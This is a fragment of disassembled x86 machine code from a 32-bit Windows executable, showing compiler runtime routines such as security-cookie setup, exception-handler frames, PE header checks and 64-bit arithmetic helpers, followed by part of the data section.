  4071e8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4071ef:	mov    eax,ecx
  4071f1:	call   0x40755d
  4071f6:	ret    0x4
  4071f9:	int3   
  4071fa:	int3   
  4071fb:	int3   
  4071fc:	int3   
  4071fd:	int3   
  4071fe:	mov    edi,edi
  407200:	push   ebp
  407201:	mov    ebp,esp
  407203:	push   0x0
  407205:	call   DWORD PTR ds:0x40c0d4
  40720b:	test   eax,eax
  40720d:	je     0x40722f
  40720f:	push   eax
  407210:	call   0x40718f
  407215:	test   eax,eax
  407217:	je     0x40722f
  407219:	movzx  ecx,WORD PTR [eax+0x5c]
  40721d:	push   0x2
  40721f:	pop    eax
  407220:	cmp    cx,ax
  407223:	je     0x407232
  407225:	cmp    ecx,0x3
  407228:	jne    0x40722f
  40722a:	xor    eax,eax
  40722c:	inc    eax
  40722d:	pop    ebp
  40722e:	ret    
  40722f:	mov    eax,DWORD PTR [ebp+0x8]
  407232:	pop    ebp
  407233:	ret    
  407234:	int3   
  407235:	int3   
  407236:	int3   
  407237:	int3   
  407238:	int3   
  407239:	int3   
  40723a:	jmp    DWORD PTR ds:0x40c13c
  407240:	int3   
  407241:	int3   
  407242:	int3   
  407243:	int3   
  407244:	int3   
  407245:	int3   
  407246:	int3   
  407247:	int3   
  407248:	int3   
  407249:	int3   
  40724a:	int3   
  40724b:	int3   
  40724c:	int3   
  40724d:	int3   
  40724e:	int3   
  40724f:	int3   
  407250:	mov    edi,edi
  407252:	push   ebp
  407253:	mov    ebp,esp
  407255:	mov    eax,DWORD PTR [ebp+0x8]
  407258:	xor    edx,edx
  40725a:	push   ebx
  40725b:	push   esi
  40725c:	push   edi
  40725d:	mov    ecx,DWORD PTR [eax+0x3c]
  407260:	add    ecx,eax
  407262:	movzx  eax,WORD PTR [ecx+0x14]
  407266:	movzx  ebx,WORD PTR [ecx+0x6]
  40726a:	add    eax,0x18
  40726d:	add    eax,ecx
  40726f:	test   ebx,ebx
  407271:	je     0x40728e
  407273:	mov    edi,DWORD PTR [ebp+0xc]
  407276:	mov    esi,DWORD PTR [eax+0xc]
  407279:	cmp    edi,esi
  40727b:	jb     0x407286
  40727d:	mov    ecx,DWORD PTR [eax+0x8]
  407280:	add    ecx,esi
  407282:	cmp    edi,ecx
  407284:	jb     0x407290
  407286:	inc    edx
  407287:	add    eax,0x28
  40728a:	cmp    edx,ebx
  40728c:	jb     0x407276
  40728e:	xor    eax,eax
  407290:	pop    edi
  407291:	pop    esi
  407292:	pop    ebx
  407293:	pop    ebp
  407294:	ret    
  407295:	int3   
  407296:	int3   
  407297:	int3   
  407298:	int3   
  407299:	int3   
  40729a:	int3   
  40729b:	int3   
  40729c:	int3   
  40729d:	int3   
  40729e:	int3   
  40729f:	int3   
  4072a0:	mov    edi,edi
  4072a2:	push   ebp
  4072a3:	mov    ebp,esp
  4072a5:	push   0xfffffffe
  4072a7:	push   0x4078f0
  4072ac:	push   0x4074e0
  4072b1:	mov    eax,fs:0x0
  4072b7:	push   eax
  4072b8:	sub    esp,0x8
  4072bb:	push   ebx
  4072bc:	push   esi
  4072bd:	push   edi
  4072be:	mov    eax,ds:0x408008
  4072c3:	xor    DWORD PTR [ebp-0x8],eax
  4072c6:	xor    eax,ebp
  4072c8:	push   eax
  4072c9:	lea    eax,[ebp-0x10]
  4072cc:	mov    fs:0x0,eax
  4072d2:	mov    DWORD PTR [ebp-0x18],esp
  4072d5:	mov    DWORD PTR [ebp-0x4],0x0
  4072dc:	push   0x400000
  4072e1:	call   0x407370
  4072e6:	add    esp,0x4
  4072e9:	test   eax,eax
  4072eb:	je     0x407341
  4072ed:	mov    eax,DWORD PTR [ebp+0x8]
  4072f0:	sub    eax,0x400000
  4072f5:	push   eax
  4072f6:	push   0x400000
  4072fb:	call   0x407250
  407300:	add    esp,0x8
  407303:	test   eax,eax
  407305:	je     0x407341
  407307:	mov    eax,DWORD PTR [eax+0x24]
  40730a:	shr    eax,0x1f
  40730d:	not    eax
  40730f:	and    eax,0x1
  407312:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407319:	mov    ecx,DWORD PTR [ebp-0x10]
  40731c:	mov    DWORD PTR fs:0x0,ecx
  407323:	pop    ecx
  407324:	pop    edi
  407325:	pop    esi
  407326:	pop    ebx
  407327:	mov    esp,ebp
  407329:	pop    ebp
  40732a:	ret    
  40732b:	mov    eax,DWORD PTR [ebp-0x14]
  40732e:	mov    eax,DWORD PTR [eax]
  407330:	xor    ecx,ecx
  407332:	cmp    DWORD PTR [eax],0xc0000005
  407338:	sete   cl
  40733b:	mov    eax,ecx
  40733d:	ret    
  40733e:	mov    esp,DWORD PTR [ebp-0x18]
  407341:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407348:	xor    eax,eax
  40734a:	mov    ecx,DWORD PTR [ebp-0x10]
  40734d:	mov    DWORD PTR fs:0x0,ecx
  407354:	pop    ecx
  407355:	pop    edi
  407356:	pop    esi
  407357:	pop    ebx
  407358:	mov    esp,ebp
  40735a:	pop    ebp
  40735b:	ret    
  40735c:	int3   
  40735d:	int3   
  40735e:	int3   
  40735f:	int3   
  407360:	int3   
  407361:	int3   
  407362:	int3   
  407363:	int3   
  407364:	int3   
  407365:	int3   
  407366:	int3   
  407367:	int3   
  407368:	int3   
  407369:	int3   
  40736a:	int3   
  40736b:	int3   
  40736c:	int3   
  40736d:	int3   
  40736e:	int3   
  40736f:	int3   
  407370:	mov    edi,edi
  407372:	push   ebp
  407373:	mov    ebp,esp
  407375:	mov    eax,DWORD PTR [ebp+0x8]
  407378:	mov    ecx,0x5a4d
  40737d:	cmp    WORD PTR [eax],cx
  407380:	je     0x407386
  407382:	xor    eax,eax
  407384:	pop    ebp
  407385:	ret    
  407386:	mov    ecx,DWORD PTR [eax+0x3c]
  407389:	add    ecx,eax
  40738b:	xor    eax,eax
  40738d:	cmp    DWORD PTR [ecx],0x4550
  407393:	jne    0x4073a1
  407395:	mov    edx,0x10b
  40739a:	cmp    WORD PTR [ecx+0x18],dx
  40739e:	sete   al
  4073a1:	pop    ebp
  4073a2:	ret    
  4073a3:	int3   
  4073a4:	int3   
  4073a5:	int3   
  4073a6:	int3   
  4073a7:	int3   
  4073a8:	mov    edi,edi
  4073aa:	push   ebp
  4073ab:	mov    ebp,esp
  4073ad:	sub    esp,0x14
  4073b0:	and    DWORD PTR [ebp-0xc],0x0
  4073b4:	and    DWORD PTR [ebp-0x8],0x0
  4073b8:	mov    eax,ds:0x408008
  4073bd:	push   esi
  4073be:	push   edi
  4073bf:	mov    edi,0xbb40e64e
  4073c4:	mov    esi,0xffff0000
  4073c9:	cmp    eax,edi
  4073cb:	je     0x4073da
  4073cd:	test   esi,eax
  4073cf:	je     0x4073da
  4073d1:	not    eax
  4073d3:	mov    ds:0x40800c,eax
  4073d8:	jmp    0x407444
  4073da:	lea    eax,[ebp-0xc]
  4073dd:	push   eax
  4073de:	call   DWORD PTR ds:0x40c0c0
  4073e4:	mov    eax,DWORD PTR [ebp-0x8]
  4073e7:	xor    eax,DWORD PTR [ebp-0xc]
  4073ea:	mov    DWORD PTR [ebp-0x4],eax
  4073ed:	call   DWORD PTR ds:0x40c0cc
  4073f3:	xor    DWORD PTR [ebp-0x4],eax
  4073f6:	call   DWORD PTR ds:0x40c0c4
  4073fc:	xor    DWORD PTR [ebp-0x4],eax
  4073ff:	call   DWORD PTR ds:0x40c0bc
  407405:	xor    eax,DWORD PTR [ebp-0x4]
  407408:	lea    ecx,[ebp-0x4]
  40740b:	xor    eax,ecx
  40740d:	mov    DWORD PTR [ebp-0x4],eax
  407410:	lea    eax,[ebp-0x14]
  407413:	push   eax
  407414:	call   DWORD PTR ds:0x40c0d0
  40741a:	mov    eax,DWORD PTR [ebp-0x10]
  40741d:	xor    eax,DWORD PTR [ebp-0x14]
  407420:	mov    ecx,DWORD PTR [ebp-0x4]
  407423:	xor    ecx,eax
  407425:	cmp    ecx,edi
  407427:	je     0x407431
  407429:	test   DWORD PTR ds:0x408008,esi
  40742f:	jne    0x407436
  407431:	mov    ecx,0xbb40e64f
  407436:	mov    DWORD PTR ds:0x408008,ecx
  40743c:	not    ecx
  40743e:	mov    DWORD PTR ds:0x40800c,ecx
  407444:	pop    edi
  407445:	pop    esi
  407446:	mov    esp,ebp
  407448:	pop    ebp
  407449:	ret    
  40744a:	int3   
  40744b:	int3   
  40744c:	int3   
  40744d:	int3   
  40744e:	int3   
  40744f:	int3   
  407450:	xor    eax,eax
  407452:	ret    
  407453:	int3   
  407454:	int3   
  407455:	int3   
  407456:	int3   
  407457:	int3   
  407458:	push   0x30000
  40745d:	push   0x10000
  407462:	call   DWORD PTR ds:0x40c118
  407468:	pop    ecx
  407469:	pop    ecx
  40746a:	ret    
  40746b:	int3   
  40746c:	int3   
  40746d:	int3   
  40746e:	int3   
  40746f:	int3   
  407470:	jmp    DWORD PTR ds:0x40c120
  407476:	int3   
  407477:	int3   
  407478:	int3   
  407479:	int3   
  40747a:	int3   
  40747b:	int3   
  40747c:	push   0x4074e0
  407481:	push   DWORD PTR fs:0x0
  407488:	mov    eax,DWORD PTR [esp+0x10]
  40748c:	mov    DWORD PTR [esp+0x10],ebp
  407490:	lea    ebp,[esp+0x10]
  407494:	sub    esp,eax
  407496:	push   ebx
  407497:	push   esi
  407498:	push   edi
  407499:	mov    eax,ds:0x408008
  40749e:	xor    DWORD PTR [ebp-0x4],eax
  4074a1:	xor    eax,ebp
  4074a3:	mov    DWORD PTR [ebp-0x1c],eax
  4074a6:	push   eax
  4074a7:	mov    DWORD PTR [ebp-0x18],esp
  4074aa:	push   DWORD PTR [ebp-0x8]
  4074ad:	mov    eax,DWORD PTR [ebp-0x4]
  4074b0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4074b7:	mov    DWORD PTR [ebp-0x8],eax
  4074ba:	lea    eax,[ebp-0x10]
  4074bd:	mov    fs:0x0,eax
  4074c3:	ret    
  4074c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4074c7:	xor    ecx,ebp
  4074c9:	call   0x406fc0
  4074ce:	jmp    0x40755d
  4074d3:	int3   
  4074d4:	int3   
  4074d5:	int3   
  4074d6:	int3   
  4074d7:	int3   
  4074d8:	int3   
  4074d9:	int3   
  4074da:	int3   
  4074db:	int3   
  4074dc:	int3   
  4074dd:	int3   
  4074de:	int3   
  4074df:	int3   
  4074e0:	mov    edi,edi
  4074e2:	push   ebp
  4074e3:	mov    ebp,esp
  4074e5:	push   DWORD PTR [ebp+0x14]
  4074e8:	push   DWORD PTR [ebp+0x10]
  4074eb:	push   DWORD PTR [ebp+0xc]
  4074ee:	push   DWORD PTR [ebp+0x8]
  4074f1:	push   0x406fc0
  4074f6:	push   0x408008
  4074fb:	call   0x407576
  407500:	add    esp,0x18
  407503:	pop    ebp
  407504:	ret    
  407505:	int3   
  407506:	int3   
  407507:	int3   
  407508:	int3   
  407509:	int3   
  40750a:	int3   
  40750b:	int3   
  40750c:	int3   
  40750d:	int3   
  40750e:	int3   
  40750f:	int3   
  407510:	ret    
  407511:	int3   
  407512:	int3   
  407513:	int3   
  407514:	int3   
  407515:	int3   
  407516:	int3   
  407517:	int3   
  407518:	push   0x4074e0
  40751d:	push   DWORD PTR fs:0x0
  407524:	mov    eax,DWORD PTR [esp+0x10]
  407528:	mov    DWORD PTR [esp+0x10],ebp
  40752c:	lea    ebp,[esp+0x10]
  407530:	sub    esp,eax
  407532:	push   ebx
  407533:	push   esi
  407534:	push   edi
  407535:	mov    eax,ds:0x408008
  40753a:	xor    DWORD PTR [ebp-0x4],eax
  40753d:	xor    eax,ebp
  40753f:	push   eax
  407540:	mov    DWORD PTR [ebp-0x18],esp
  407543:	push   DWORD PTR [ebp-0x8]
  407546:	mov    eax,DWORD PTR [ebp-0x4]
  407549:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  407550:	mov    DWORD PTR [ebp-0x8],eax
  407553:	lea    eax,[ebp-0x10]
  407556:	mov    fs:0x0,eax
  40755c:	ret    
  40755d:	mov    ecx,DWORD PTR [ebp-0x10]
  407560:	mov    DWORD PTR fs:0x0,ecx
  407567:	pop    ecx
  407568:	pop    edi
  407569:	pop    edi
  40756a:	pop    esi
  40756b:	pop    ebx
  40756c:	mov    esp,ebp
  40756e:	pop    ebp
  40756f:	push   ecx
  407570:	ret    
  407571:	int3   
  407572:	int3   
  407573:	int3   
  407574:	int3   
  407575:	int3   
  407576:	jmp    DWORD PTR ds:0x40c114
  40757c:	int3   
  40757d:	int3   
  40757e:	int3   
  40757f:	int3   
  407580:	int3   
  407581:	int3   
  407582:	int3   
  407583:	int3   
  407584:	int3   
  407585:	int3   
  407586:	int3   
  407587:	int3   
  407588:	int3   
  407589:	int3   
  40758a:	int3   
  40758b:	int3   
  40758c:	int3   
  40758d:	int3   
  40758e:	int3   
  40758f:	int3   
  407590:	push   edi
  407591:	push   esi
  407592:	push   ebx
  407593:	xor    edi,edi
  407595:	mov    eax,DWORD PTR [esp+0x14]
  407599:	or     eax,eax
  40759b:	jge    0x4075b1
  40759d:	inc    edi
  40759e:	mov    edx,DWORD PTR [esp+0x10]
  4075a2:	neg    eax
  4075a4:	neg    edx
  4075a6:	sbb    eax,0x0
  4075a9:	mov    DWORD PTR [esp+0x14],eax
  4075ad:	mov    DWORD PTR [esp+0x10],edx
  4075b1:	mov    eax,DWORD PTR [esp+0x1c]
  4075b5:	or     eax,eax
  4075b7:	jge    0x4075cd
  4075b9:	inc    edi
  4075ba:	mov    edx,DWORD PTR [esp+0x18]
  4075be:	neg    eax
  4075c0:	neg    edx
  4075c2:	sbb    eax,0x0
  4075c5:	mov    DWORD PTR [esp+0x1c],eax
  4075c9:	mov    DWORD PTR [esp+0x18],edx
  4075cd:	or     eax,eax
  4075cf:	jne    0x4075e9
  4075d1:	mov    ecx,DWORD PTR [esp+0x18]
  4075d5:	mov    eax,DWORD PTR [esp+0x14]
  4075d9:	xor    edx,edx
  4075db:	div    ecx
  4075dd:	mov    ebx,eax
  4075df:	mov    eax,DWORD PTR [esp+0x10]
  4075e3:	div    ecx
  4075e5:	mov    edx,ebx
  4075e7:	jmp    0x40762a
  4075e9:	mov    ebx,eax
  4075eb:	mov    ecx,DWORD PTR [esp+0x18]
  4075ef:	mov    edx,DWORD PTR [esp+0x14]
  4075f3:	mov    eax,DWORD PTR [esp+0x10]
  4075f7:	shr    ebx,1
  4075f9:	rcr    ecx,1
  4075fb:	shr    edx,1
  4075fd:	rcr    eax,1
  4075ff:	or     ebx,ebx
  407601:	jne    0x4075f7
  407603:	div    ecx
  407605:	mov    esi,eax
  407607:	mul    DWORD PTR [esp+0x1c]
  40760b:	mov    ecx,eax
  40760d:	mov    eax,DWORD PTR [esp+0x18]
  407611:	mul    esi
  407613:	add    edx,ecx
  407615:	jb     0x407625
  407617:	cmp    edx,DWORD PTR [esp+0x14]
  40761b:	ja     0x407625
  40761d:	jb     0x407626
  40761f:	cmp    eax,DWORD PTR [esp+0x10]
  407623:	jbe    0x407626
  407625:	dec    esi
  407626:	xor    edx,edx
  407628:	mov    eax,esi
  40762a:	dec    edi
  40762b:	jne    0x407634
  40762d:	neg    edx
  40762f:	neg    eax
  407631:	sbb    edx,0x0
  407634:	pop    ebx
  407635:	pop    esi
  407636:	pop    edi
  407637:	ret    0x10
  40763a:	int3   
  40763b:	int3   
  40763c:	int3   
  40763d:	int3   
  40763e:	int3   
  40763f:	int3   
  407640:	push   edi
  407641:	push   esi
  407642:	push   ebp
  407643:	xor    edi,edi
  407645:	xor    ebp,ebp
  407647:	mov    eax,DWORD PTR [esp+0x14]
  40764b:	or     eax,eax
  40764d:	jge    0x407664
  40764f:	inc    edi
  407650:	inc    ebp
  407651:	mov    edx,DWORD PTR [esp+0x10]
  407655:	neg    eax
  407657:	neg    edx
  407659:	sbb    eax,0x0
  40765c:	mov    DWORD PTR [esp+0x14],eax
  407660:	mov    DWORD PTR [esp+0x10],edx
  407664:	mov    eax,DWORD PTR [esp+0x1c]
  407668:	or     eax,eax
  40766a:	jge    0x407680
  40766c:	inc    edi
  40766d:	mov    edx,DWORD PTR [esp+0x18]
  407671:	neg    eax
  407673:	neg    edx
  407675:	sbb    eax,0x0
  407678:	mov    DWORD PTR [esp+0x1c],eax
  40767c:	mov    DWORD PTR [esp+0x18],edx
  407680:	or     eax,eax
  407682:	jne    0x4076ac
  407684:	mov    ecx,DWORD PTR [esp+0x18]
  407688:	mov    eax,DWORD PTR [esp+0x14]
  40768c:	xor    edx,edx
  40768e:	div    ecx
  407690:	mov    ebx,eax
  407692:	mov    eax,DWORD PTR [esp+0x10]
  407696:	div    ecx
  407698:	mov    esi,eax
  40769a:	mov    eax,ebx
  40769c:	mul    DWORD PTR [esp+0x18]
  4076a0:	mov    ecx,eax
  4076a2:	mov    eax,esi
  4076a4:	mul    DWORD PTR [esp+0x18]
  4076a8:	add    edx,ecx
  4076aa:	jmp    0x4076f3
  4076ac:	mov    ebx,eax
  4076ae:	mov    ecx,DWORD PTR [esp+0x18]
  4076b2:	mov    edx,DWORD PTR [esp+0x14]
  4076b6:	mov    eax,DWORD PTR [esp+0x10]
  4076ba:	shr    ebx,1
  4076bc:	rcr    ecx,1
  4076be:	shr    edx,1
  4076c0:	rcr    eax,1
  4076c2:	or     ebx,ebx
  4076c4:	jne    0x4076ba
  4076c6:	div    ecx
  4076c8:	mov    esi,eax
  4076ca:	mul    DWORD PTR [esp+0x1c]
  4076ce:	mov    ecx,eax
  4076d0:	mov    eax,DWORD PTR [esp+0x18]
  4076d4:	mul    esi
  4076d6:	add    edx,ecx
  4076d8:	jb     0x4076e8
  4076da:	cmp    edx,DWORD PTR [esp+0x14]
  4076de:	ja     0x4076e8
  4076e0:	jb     0x4076f1
  4076e2:	cmp    eax,DWORD PTR [esp+0x10]
  4076e6:	jbe    0x4076f1
  4076e8:	dec    esi
  4076e9:	sub    eax,DWORD PTR [esp+0x18]
  4076ed:	sbb    edx,DWORD PTR [esp+0x1c]
  4076f1:	xor    ebx,ebx
  4076f3:	sub    eax,DWORD PTR [esp+0x10]
  4076f7:	sbb    edx,DWORD PTR [esp+0x14]
  4076fb:	dec    ebp
  4076fc:	jns    0x407705
  4076fe:	neg    edx
  407700:	neg    eax
  407702:	sbb    edx,0x0
  407705:	mov    ecx,edx
  407707:	mov    edx,ebx
  407709:	mov    ebx,ecx
  40770b:	mov    ecx,eax
  40770d:	mov    eax,esi
  40770f:	dec    edi
  407710:	jne    0x407719
  407712:	neg    edx
  407714:	neg    eax
  407716:	sbb    edx,0x0
  407719:	pop    ebp
  40771a:	pop    esi
  40771b:	pop    edi
  40771c:	ret    0x10
  40771f:	int3   
  407720:	int3   
  407721:	int3   
  407722:	int3   
  407723:	int3   
  407724:	int3   
  407725:	int3   
  407726:	int3   
  407727:	int3   
  407728:	int3   
  407729:	int3   
  40772a:	int3   
  40772b:	int3   
  40772c:	int3   
  40772d:	int3   
  40772e:	int3   
  40772f:	int3   
  407730:	mov    eax,DWORD PTR [esp+0x8]
  407734:	mov    ecx,DWORD PTR [esp+0x10]
  407738:	or     ecx,eax
  40773a:	mov    ecx,DWORD PTR [esp+0xc]
  40773e:	jne    0x407749
  407740:	mov    eax,DWORD PTR [esp+0x4]
  407744:	mul    ecx
  407746:	ret    0x10
  407749:	push   ebx
  40774a:	mul    ecx
  40774c:	mov    ebx,eax
  40774e:	mov    eax,DWORD PTR [esp+0x8]
  407752:	mul    DWORD PTR [esp+0x14]
  407756:	add    ebx,eax
  407758:	mov    eax,DWORD PTR [esp+0x8]
  40775c:	mul    ecx
  40775e:	add    edx,ebx
  407760:	pop    ebx
  407761:	ret    0x10
  407764:	int3   
  407765:	int3   
  407766:	int3   
  407767:	int3   
  407768:	int3   
  407769:	int3   
  40776a:	int3   
  40776b:	int3   
  40776c:	int3   
  40776d:	int3   
  40776e:	int3   
  40776f:	int3   
  407770:	push   ebx
  407771:	push   edi
  407772:	xor    edi,edi
  407774:	mov    eax,DWORD PTR [esp+0x10]
  407778:	or     eax,eax
  40777a:	jge    0x407790
  40777c:	inc    edi
  40777d:	mov    edx,DWORD PTR [esp+0xc]
  407781:	neg    eax
  407783:	neg    edx
  407785:	sbb    eax,0x0
  407788:	mov    DWORD PTR [esp+0x10],eax
  40778c:	mov    DWORD PTR [esp+0xc],edx
  407790:	mov    eax,DWORD PTR [esp+0x18]
  407794:	or     eax,eax
  407796:	jge    0x4077ab
  407798:	mov    edx,DWORD PTR [esp+0x14]
  40779c:	neg    eax
  40779e:	neg    edx
  4077a0:	sbb    eax,0x0
  4077a3:	mov    DWORD PTR [esp+0x18],eax
  4077a7:	mov    DWORD PTR [esp+0x14],edx
  4077ab:	or     eax,eax
  4077ad:	jne    0x4077ca
  4077af:	mov    ecx,DWORD PTR [esp+0x14]
  4077b3:	mov    eax,DWORD PTR [esp+0x10]
  4077b7:	xor    edx,edx
  4077b9:	div    ecx
  4077bb:	mov    eax,DWORD PTR [esp+0xc]
  4077bf:	div    ecx
  4077c1:	mov    eax,edx
  4077c3:	xor    edx,edx
  4077c5:	dec    edi
  4077c6:	jns    0x407816
  4077c8:	jmp    0x40781d
  4077ca:	mov    ebx,eax
  4077cc:	mov    ecx,DWORD PTR [esp+0x14]
  4077d0:	mov    edx,DWORD PTR [esp+0x10]
  4077d4:	mov    eax,DWORD PTR [esp+0xc]
  4077d8:	shr    ebx,1
  4077da:	rcr    ecx,1
  4077dc:	shr    edx,1
  4077de:	rcr    eax,1
  4077e0:	or     ebx,ebx
  4077e2:	jne    0x4077d8
  4077e4:	div    ecx
  4077e6:	mov    ecx,eax
  4077e8:	mul    DWORD PTR [esp+0x18]
  4077ec:	xchg   ecx,eax
  4077ed:	mul    DWORD PTR [esp+0x14]
  4077f1:	add    edx,ecx
  4077f3:	jb     0x407803
  4077f5:	cmp    edx,DWORD PTR [esp+0x10]
  4077f9:	ja     0x407803
  4077fb:	jb     0x40780b
  4077fd:	cmp    eax,DWORD PTR [esp+0xc]
  407801:	jbe    0x40780b
  407803:	sub    eax,DWORD PTR [esp+0x14]
  407807:	sbb    edx,DWORD PTR [esp+0x18]
  40780b:	sub    eax,DWORD PTR [esp+0xc]
  40780f:	sbb    edx,DWORD PTR [esp+0x10]
  407813:	dec    edi
  407814:	jns    0x40781d
  407816:	neg    edx
  407818:	neg    eax
  40781a:	sbb    edx,0x0
  40781d:	pop    edi
  40781e:	pop    ebx
  40781f:	ret    0x10
  407822:	int3   
  407823:	int3   
  407824:	int3   
  407825:	int3   
  407826:	int3   
  407827:	int3   
  407828:	int3   
  407829:	int3   
  40782a:	int3   
  40782b:	int3   
  40782c:	int3   
  40782d:	int3   
  40782e:	int3   
  40782f:	int3   
  407830:	push   ebx
  407831:	push   esi
  407832:	mov    eax,DWORD PTR [esp+0x18]
  407836:	or     eax,eax
  407838:	jne    0x407852
  40783a:	mov    ecx,DWORD PTR [esp+0x14]
  40783e:	mov    eax,DWORD PTR [esp+0x10]
  407842:	xor    edx,edx
  407844:	div    ecx
  407846:	mov    ebx,eax
  407848:	mov    eax,DWORD PTR [esp+0xc]
  40784c:	div    ecx
  40784e:	mov    edx,ebx
  407850:	jmp    0x407893
  407852:	mov    ecx,eax
  407854:	mov    ebx,DWORD PTR [esp+0x14]
  407858:	mov    edx,DWORD PTR [esp+0x10]
  40785c:	mov    eax,DWORD PTR [esp+0xc]
  407860:	shr    ecx,1
  407862:	rcr    ebx,1
  407864:	shr    edx,1
  407866:	rcr    eax,1
  407868:	or     ecx,ecx
  40786a:	jne    0x407860
  40786c:	div    ebx
  40786e:	mov    esi,eax
  407870:	mul    DWORD PTR [esp+0x18]
  407874:	mov    ecx,eax
  407876:	mov    eax,DWORD PTR [esp+0x14]
  40787a:	mul    esi
  40787c:	add    edx,ecx
  40787e:	jb     0x40788e
  407880:	cmp    edx,DWORD PTR [esp+0x10]
  407884:	ja     0x40788e
  407886:	jb     0x40788f
  407888:	cmp    eax,DWORD PTR [esp+0xc]
  40788c:	jbe    0x40788f
  40788e:	dec    esi
  40788f:	xor    edx,edx
  407891:	mov    eax,esi
  407893:	pop    esi
  407894:	pop    ebx
  407895:	ret    0x10
  407898:	int3   
  407899:	int3   
  40789a:	int3   
  40789b:	int3   
  40789c:	int3   
  40789d:	int3   
  40789e:	jmp    DWORD PTR ds:0x40c110
  4078a4:	int3   
  4078a5:	int3   
  4078a6:	int3   
  4078a7:	int3   
  4078a8:	int3   
  4078a9:	int3   
  4078aa:	jmp    DWORD PTR ds:0x40c170
  4078b0:	in     al,0xff
  4078b2:	(bad)  
  4078b3:	inc    DWORD PTR [eax]
  4078b5:	add    BYTE PTR [eax],al
  4078b7:	add    al,dl
  4078b9:	(bad)  
  4078ba:	(bad)  
  4078bb:	inc    DWORD PTR [eax]
  4078bd:	add    BYTE PTR [eax],al
  4078bf:	add    dh,bh
  4078c1:	(bad)  
  4078c2:	(bad)  
  4078c3:	inc    DWORD PTR [edi]
  4078c5:	outs   dx,DWORD PTR ds:[esi]
  4078c6:	inc    eax
  4078c7:	add    BYTE PTR [ebx],bl
  4078c9:	outs   dx,DWORD PTR ds:[esi]
  4078ca:	inc    eax
  4078cb:	add    BYTE PTR [eax],al
  4078cd:	add    BYTE PTR [eax],al
  4078cf:	add    dh,bh
  4078d1:	(bad)  
  4078d2:	(bad)  
  4078d3:	inc    DWORD PTR [eax]
  4078d5:	add    BYTE PTR [eax],al
  4078d7:	add    ah,dl
  4078d9:	(bad)  
  4078da:	(bad)  
  4078db:	inc    DWORD PTR [eax]
  4078dd:	add    BYTE PTR [eax],al
  4078df:	add    dh,bh
  4078e1:	(bad)  
  4078e2:	(bad)  
  4078e3:	(bad)  
  4078e4:	fdiv   QWORD PTR [ecx+0x40]
  4078e7:	add    al,ah
  4078e9:	jno    0x40792b
  4078eb:	add    BYTE PTR [eax],al
  4078ed:	add    BYTE PTR [eax],al
  4078ef:	add    dh,bh
  4078f1:	(bad)  
  4078f2:	(bad)  
  4078f3:	inc    DWORD PTR [eax]
  4078f5:	add    BYTE PTR [eax],al
  4078f7:	add    al,bl
  4078f9:	(bad)  
  4078fa:	(bad)  
  4078fb:	inc    DWORD PTR [eax]
  4078fd:	add    BYTE PTR [eax],al
  4078ff:	add    dh,bh
  407901:	(bad)  
  407902:	(bad)  
  407903:	jmp    FWORD PTR [ebx]
  407905:	jae    0x407947
  407907:	add    BYTE PTR [esi],bh
  407909:	jae    0x40794b
	...

Disassembly of section .data:

00408000 <.data>:
  408000:	add    BYTE PTR [eax+0x10000],al
  408006:	add    BYTE PTR [eax],al
  408008:	dec    esi
  408009:	out    0x40,al
  40800b:	mov    ebx,0x44bf19b1
  408010:	or     BYTE PTR [eax],al
  408012:	add    BYTE PTR [eax],al
  408014:	ins    BYTE PTR es:[edi],dx
  408015:	adc    al,BYTE PTR [eax+0x0]
  408018:	or     DWORD PTR [eax],eax
  40801a:	add    BYTE PTR [eax],al
  40801c:	adc    BYTE PTR [edx],0x40
  40801f:	add    BYTE PTR ds:0x94000000,cl
  408025:	adc    al,BYTE PTR [eax+0x0]
  408028:	adc    al,BYTE PTR [eax]
  40802a:	add    BYTE PTR [eax],al
  40802c:	mov    al,0x12
  40802e:	inc    eax
  40802f:	add    BYTE PTR [edi],cl
  408031:	add    BYTE PTR [eax],al
  408033:	add    al,bl
  408035:	adc    al,BYTE PTR [eax+0x0]
  408038:	adc    eax,DWORD PTR [eax]
  40803a:	add    BYTE PTR [eax],al
  40803c:	clc    
  40803d:	adc    al,BYTE PTR [eax+0x0]
  408040:	push   cs
  408041:	add    BYTE PTR [eax],al
  408043:	add    BYTE PTR [eax],ah
  408045:	adc    eax,DWORD PTR [eax+0x0]
  408048:	adc    al,BYTE PTR [eax]
  40804a:	add    BYTE PTR [eax],al
  40804c:	inc    eax
  40804d:	adc    eax,DWORD PTR [eax+0x0]
  408050:	adc    eax,0x68000000
  408055:	adc    eax,DWORD PTR [eax+0x0]
  408058:	or     al,0x0
  40805a:	add    BYTE PTR [eax],al
  40805c:	xchg   esp,eax
  40805d:	adc    eax,DWORD PTR [eax+0x0]
  408060:	adc    BYTE PTR [eax],al
  408062:	add    BYTE PTR [eax],al
  408064:	mov    al,0x13
  408066:	inc    eax
  408067:	add    BYTE PTR [eax+eax*1],cl
  40806a:	add    BYTE PTR [eax],al
  40806c:	aam    0x13
  40806e:	inc    eax
  40806f:	add    BYTE PTR [eax],dl
  408071:	add    BYTE PTR [eax],al
  408073:	add    al,dh
  408075:	adc    eax,DWORD PTR [eax+0x0]
  408078:	push   cs
  408079:	add    BYTE PTR [eax],al
  40807b:	add    BYTE PTR [esp+edx*1],dl
  40807e:	inc    eax
  40807f:	add    BYTE PTR [edx],dl
  408081:	add    BYTE PTR [eax],al
  408083:	add    BYTE PTR [esp+edx*1],dh
  408086:	inc    eax
  408087:	add    BYTE PTR [esi],cl
  408089:	add    BYTE PTR [eax],al
  40808b:	add    BYTE PTR [esp+edx*1+0x40],bl
  40808f:	add    BYTE PTR [edx],dl
  408091:	add    BYTE PTR [eax],al
  408093:	add    BYTE PTR [esp+edx*1+0x40],bh
  408097:	add    BYTE PTR [eax],al
  408099:	add    BYTE PTR [eax],al
  40809b:	add    BYTE PTR [ecx+edx*1+0x40],bh
  40809f:	add    BYTE PTR [eax],cl
  4080a1:	add    BYTE PTR [eax],al
  4080a3:	add    BYTE PTR [esp+edx*1+0xf0040],ah
  4080aa:	add    BYTE PTR [eax],al
  4080ac:	mov    eax,0xb004014
  4080b1:	add    BYTE PTR [eax],al
  4080b3:	add    al,bl
  4080b5:	adc    al,0x40
  4080b7:	add    BYTE PTR [eax],al
  4080b9:	add    BYTE PTR [eax],al
  4080bb:	add    BYTE PTR [ecx+edx*1+0x40],bh
	...

